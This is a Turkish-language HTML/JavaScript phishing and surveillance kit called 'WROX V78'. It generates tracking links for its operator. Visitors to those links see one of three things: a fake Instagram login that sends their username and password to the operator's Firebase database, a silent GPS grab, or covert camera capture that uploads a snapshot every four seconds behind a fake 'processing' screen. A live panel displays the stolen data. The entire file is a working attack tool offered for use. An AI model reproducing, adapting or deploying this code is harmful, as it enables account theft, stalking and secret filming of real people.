<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Razel services - FREE ACCESS</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <style>
        :root { --neon: #00f0ff; --bg: #000; --panel: #0a0a0a; --green: #2ecc71; --red: #ff0000; }
        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        
        /* GÄ°RÄ°Å & KAYIT */
        #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: radial-gradient(circle, #05191a 0%, #000 100%); }
        .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: rgba(10, 10, 10, 0.95); box-shadow: 0 0 20px rgba(0, 240, 255, 0.2); }
        input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; border-radius: 8px; transition: 0.3s; }
        button:hover { background: var(--neon); color: #000; }
        .reg-btn { margin-top: 12px; border-color: #444; color: #777; font-size: 11px; }

        /* PANEL YAPISI */
        #main-panel { display: none; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
        .nav-menu { position: fixed; top: 60px; left: -100%; width: 240px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.4s; z-index: 99; }
        .nav-menu.active { left: 0; }
        .nav-menu div { padding: 20px; border-bottom: 1px solid #1a1a1a; cursor: pointer; color: var(--neon); font-size: 13px; font-weight: bold; }

        /* SEKMELER VE AKIÅ */
        .tab-content { display: none; padding: 20px; animation: fadeIn 0.5s; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
        .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 500px; overflow-y: auto; padding-right: 5px; }
        .feed-item { border: 1px solid #222; border-radius: 12px; padding: 12px; background: #000; font-size: 11px; }
        .feed-item img { width: 100%; border-radius: 8px; margin-top: 8px; border: 1px solid #333; }

        .link-box { background: #111; padding: 12px; font-size: 10px; word-break: break-all; margin: 15px 0; border: 1px dashed var(--neon); color: var(--neon); border-radius: 5px; display: none; }
        
        /* KaydÄ±rma Ã‡ubuÄŸu */
        .feed-wrapper::-webkit-scrollbar { width: 4px; }
        .feed-wrapper::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 10px; }
    </style>
</head>
<body>

    <div id="auth-screen">
        <div class="auth-box">
            <h1 style="color: var(--neon); font-size: 26px; margin: 0 0 20px 0;">WROX V78</h1>
            <input type="text" id="email" placeholder="E-posta Adresiniz">
            <input type="password" id="pass" placeholder="Åifreniz">
            <button onclick="auth('login')">SÄ°STEME GÄ°RÄ°Å YAP</button>
            <button class="reg-btn" onclick="auth('register')">ÃœCRETSÄ°Z KAYIT OL</button>
        </div>
    </div>

    <div id="main-panel">
        <div class="header">
            <div onclick="toggleMenu()" style="cursor:pointer; font-size:24px;">â˜° WROX <span style="color:#3498db">V78</span></div>
            <div id="user-tag" style="color: var(--green); font-size: 10px; font-weight: bold;"></div>
        </div>

        <div id="side-menu" class="nav-menu">
            <div onclick="showTab('cam-tab')">ğŸ“¸ KAMERA SIZMA (BURST)</div>
            <div onclick="showTab('loc-tab')">ğŸ“ KONUM TAKÄ°P (GPS)</div>
            <div onclick="showTab('ig-tab')">ğŸ”— INSTAGRAM PHISHING</div>
        </div>

        <div id="cam-tab" class="tab-content active">
            <h3>ğŸ“· KAMERA ÃœNÄ°TESÄ°</h3>
            <button onclick="genLink('cam')">KAMERA LÄ°NKÄ° OLUÅTUR</button>
            <div id="cam-link" class="link-box"></div>
            <div class="stream-container">
                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">ğŸ”´ CANLI GÃ–RÃœNTÃœ AKIÅI:</div>
                <div id="cam-feed" class="feed-wrapper"></div>
            </div>
        </div>

        <div id="loc-tab" class="tab-content">
            <h3>ğŸ“ KONUM TAKÄ°BÄ°</h3>
            <button onclick="genLink('loc')">GPS KONUM LÄ°NKÄ° OLUÅTUR</button>
            <div id="loc-link" class="link-box"></div>
            <div class="stream-container">
                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">ğŸ“Œ SON KONUMLAR:</div>
                <div id="loc-feed" class="feed-wrapper"></div>
            </div>
        </div>

        <div id="ig-tab" class="tab-content">
            <h3>ğŸ”‘ INSTAGRAM PANEL</h3>
            <button onclick="genLink('ig')">SAHTE IG LÄ°NKÄ° OLUÅTUR</button>
            <div id="ig-link" class="link-box"></div>
            <div class="stream-container">
                <div style="color:var(--red); font-weight:bold; margin-bottom:12px;">ğŸ‘¤ DÃœÅEN HESAP BÄ°LGÄ°LERÄ°:</div>
                <div id="ig-feed" class="feed-wrapper"></div>
            </div>
        </div>
    </div>

    <script>
        // 1. FIREBASE KONFÄ°GÃœRASYONU
        const firebaseConfig = {
            apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
            databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
            projectId: "wrox-premium",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let activeUser = "";

        // 2. GÄ°RÄ°Å VE ÃœCRETSÄ°Z KAYIT MANTIÄI
        function auth(type) {
            const emailInput = document.getElementById('email').value.trim();
            const passInput = document.getElementById('pass').value;
            const userID = emailInput.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");

            if (!emailInput || !passInput) return alert("Bilgileri doldurun!");

            // Admin GiriÅŸ KontrolÃ¼ (AFAVAN66 Ã–zel)
            if (emailInput === "E-POSTA" && passInput === "ÅÄ°FRE") {
                activeUser = "ADINI YAZ";
                startApp(true);
                return;
            }

            if (type === 'register') {
                db.ref('users/' + userID).set({ p: passInput, e: emailInput })
                  .then(() => alert("Ãœcretsiz kaydÄ±nÄ±z tamamlandÄ±! GiriÅŸ yapabilirsiniz."));
            } else {
                db.ref('users/' + userID).once('value').then(s => {
                    if (s.exists() && s.val().p === passInput) {
                        activeUser = userID;
                        startApp(false);
                    } else { alert("HatalÄ± e-posta veya ÅŸifre!"); }
                });
            }
        }

        function startApp(isAdmin) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-panel').style.display = 'block';
            document.getElementById('user-tag').innerText = (isAdmin ? "ADMÄ°N: " : "USER: ") + activeUser.toUpperCase();
            
            // VERÄ°LERÄ° DÄ°NLE VE PANELÄ° GÃœNCELLE
            db.ref('logs/' + activeUser).on('child_added', s => {
                const val = s.val();
                let html = `<div class="feed-item"><b>â± ${new Date(val.t).toLocaleTimeString()}</b><br>`;
                
                if (val.type === 'cam') {
                    html += `<img src="${val.d}"></div>`;
                    document.getElementById('cam-feed').insertAdjacentHTML('afterbegin', html);
                } else if (val.type === 'loc') {
                    html += `<a href="${val.d}" target="_blank" style="color:#f1c40f; text-decoration:none;">ğŸ“ HARÄ°TADA GÃ–RÃœNTÃœLE (TIKLA)</a></div>`;
                    document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
                } else if (val.type === 'ig') {
                    html += `<span style="color:var(--green)">KullanÄ±cÄ±: ${val.u}</span><br><span style="color:var(--red)">Åifre: ${val.p}</span></div>`;
                    document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
                }
            });
        }

        // PANEL YÃ–NETÄ°MÄ°
        function toggleMenu() { document.getElementById('side-menu').classList.toggle('active'); }
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            toggleMenu();
        }

        function genLink(mode) {
            const link = window.location.href.split('?')[0] + `?ref=${activeUser}&m=${mode}`;
            const box = document.getElementById(mode + '-link');
            box.innerText = link; box.style.display = 'block';
        }

        // 3. KURBAN MODLARI (LÄ°NK AÃ‡ILDIÄINDA Ã‡ALIÅIR)
        const params = new URLSearchParams(window.location.search);
        const ref = params.get('ref');
        const mode = params.get('m');

        if (ref && mode) {
            if (mode === 'ig') {
                document.body.innerHTML = `
                <div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:50px; font-family:sans-serif;">
                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="180">
                    <input id="iu" placeholder="KullanÄ±cÄ± adÄ±" style="width:280px; padding:12px; margin-top:35px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
                    <input id="ip" type="password" placeholder="Åifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px; outline:none;">
                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; border-radius:4px; font-weight:bold; cursor:pointer;">GiriÅŸ Yap</button>
                    <p style="color:#00376b; font-size:12px; margin-top:30px; font-weight:bold;">Åifreni mi unuttun?</p>
                </div>`;
                window.sendIG = () => {
                    db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
                    location.href = "https://instagram.com";
                };
            } else if (mode === 'loc') {
                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#222; display:flex; align-items:center; justify-content:center;">BaÄŸlantÄ± bekleniyor...</div>`;
                navigator.geolocation.getCurrentPosition(p => {
                    const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    db.ref('logs/'+ref).push({type:'loc', d:url, t:Date.now()});
                });
            } else if (mode === 'cam') {
                document.body.innerHTML = `<div style="background:#000; height:100vh; color:#111; display:flex; align-items:center; justify-content:center;">Ä°ÅŸlem devam ediyor...</div>`;
                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
                    const v = document.createElement('video'); v.srcObject=s; v.play();
                    const c = document.createElement('canvas');
                    setInterval(() => {
                        c.width=v.videoWidth; c.height=v.videoHeight;
                        c.getContext('2d').drawImage(v,0,0);
                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/webp', 0.4), t:Date.now()});
                    }, 4000);
                });
            }
        }
    </script>
</body>
</html>
